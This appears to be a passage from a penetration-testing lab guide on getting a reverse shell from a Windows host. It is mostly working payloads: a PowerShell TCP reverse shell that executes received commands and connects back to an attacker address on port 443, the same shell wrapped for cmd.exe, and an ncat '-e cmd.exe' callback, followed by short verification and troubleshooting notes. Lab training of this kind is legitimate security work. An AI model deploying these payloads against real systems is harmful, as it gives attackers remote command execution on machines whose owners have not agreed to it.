## 2. Windows PowerShell — connect back

**Windows PowerShell**

```powershell
$client = New-Object System.Net.Sockets.TCPClient('LHOST',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

Replace LHOST with Kali’s reachable VPN address. Choose this OR the cmd.exe version below.

## Alternative for Windows cmd.exe

**Windows cmd.exe**

```text
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('LHOST',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

Replace LHOST with your reachable Kali/VPN address. This exact wrapper is for cmd.exe; do not paste it inside an existing PowerShell prompt.

## Receive a Windows Ncat command session

**Run in:** Windows cmd.exe. **Requires:** A Windows Ncat build supporting -e already on the lab host, a Kali ncat -lvnp 4444 listener and permitted outbound connectivity.

```console
ncat.exe KALI_IP 4444 -e cmd.exe
```

**What the result establishes:** Match platform, architecture, callback address and listener protocol, then verify the received process identity.

**Next check:** Verify the selected executable and command processor, then run whoami and hostname; this stream does not provide a full Windows console.

## If it fails

| Symptom | Check |
| --- | --- |
| The listener receives a connection but no usable command prompt | A TCP connection is not automatically a working shell; command quoting, process lifetime and egress can each break the chain. |
